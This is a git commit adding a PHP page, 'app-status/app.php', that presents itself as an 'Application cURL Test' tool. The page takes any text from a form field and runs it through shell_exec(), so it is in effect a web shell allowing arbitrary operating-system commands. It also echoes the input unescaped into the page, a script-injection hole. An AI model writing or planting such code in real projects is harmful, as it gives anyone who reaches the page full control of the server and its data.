370640e513bef7c1ded299517715432bda215a67
Nel Toms <morphius@Nels-MacBook-Pro-2.local>
2022-03-19 15:12:15 -0500

    add app-status app

---
+++ app-status/app.php
@@ -0,0 +1,22 @@
+<!DOCTYPE html>
+
+<body style="background-color: black">
+	<h2 style="color: powderblue">Application cURL Test</h2>
+	<div style="color: white">Enter cURL command below:</div><br>
+	<form style="color: white" action="index.php" method="post">
+		command: <input style="background-color: lightgrey" size="80" type="text" name="command">
+		<input type="submit">
+	</form>
+
+	<?php
+	
+		$command = $_POST['command'];
+		echo "<pre style='color: white'>";
+		echo "<strong style='color: powderblue'>Last Command Run: <span style='color: red'>$command</span></strong>";
+		echo "\r\n\n";
+		echo shell_exec($command);
+		echo "</pre>";
+
+	?>
+</body>
+ 	
